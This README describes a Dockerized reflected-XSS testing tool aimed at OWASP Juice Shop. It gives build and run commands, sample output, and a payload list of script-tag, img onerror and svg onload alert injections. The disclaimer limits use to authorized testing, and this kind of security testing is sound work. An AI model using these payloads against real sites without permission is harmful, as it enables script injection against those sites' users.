README.md

# Reflected XSS Testing Tool

This standalone tool is designed to test for **Reflected Cross-Site Scripting (XSS)** vulnerabilities on web applications. It sends crafted payloads to a specified endpoint and checks for potential vulnerabilities.

---

## Features

- **Automated Testing**: Iterates through a list of XSS payloads.
- **HTTP Response Logging**: Displays the status code for each request.
- **Dockerized Environment**: Portable and consistent testing setup.

---

## Usage

### Prerequisites

1. Ensure the target application (e.g., [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)) is running and accessible.
2. Install [Docker](https://www.docker.com/).

---

### Step 1: Clone or Copy the Repository

Download the tool to your local environment:
```bash
git clone https://github.com/YamatoGr93/reflected-xxs.git
cd reflected-xss

Step 2: Build the Docker Image

Build the tool's Docker image:

docker build -t reflected-xss .

Step 3: Run the Tool

Run the tool against a target endpoint. Replace <endpoint> with the vulnerable path on your target application (e.g., /search?q=):

docker run --rm --network host reflected-xss "<endpoint>"

Example:

docker run --rm --network host reflected-xss "/search?q="

Expected Output

For each payload in payloads.txt, the tool will generate URLs and log HTTP responses. Example output:

Testing Reflected XSS on endpoint: http://xxx.xx.x.x:3000/search?q=

Tested: http://xxx.xx.x.x:3000/search?q=<script>alert('XSS')</script> | Status: 200
Tested: http://xxx.xx.x.x:3000/search?q="><script>alert('XSS')</script> | Status: 200
Tested: http://xxx.xx.x.x:3000/search?q="><img%20src=x%20onerror=alert('XSS')> | Status: 200
Tested: http://xxx.xx.x.x:3000/search?q="><svg%20onload=alert('XSS')> | Status: 200

Payloads

The tool uses the following XSS payloads (stored in payloads.txt):

    <script>alert('XSS')</script>
    "><script>alert('XSS')</script>
    "><img src=x onerror=alert('XSS')>
    "><svg onload=alert('XSS')>

You can add or modify payloads in the payloads.txt file.
Troubleshooting
Common Issues

    Connection Refused: Ensure the target application is running and accessible.
        For local testing, verify the Juice Shop instance is running at http://localhost:3000.
        Use http://xxx.xx.x.x:3000 if running from within Docker.
    Host Resolution Error: Use the --network host option when running the Docker container.

Disclaimer

This tool is for educational and authorized penetration testing purposes only. Use it responsibly and only on systems you have permission to test.
Contribution

Feel free to fork this repository and submit pull requests to enhance the tool. Suggestions and improvements are welcome!
License

This project is licensed under the MIT License. See the LICENSE file for details.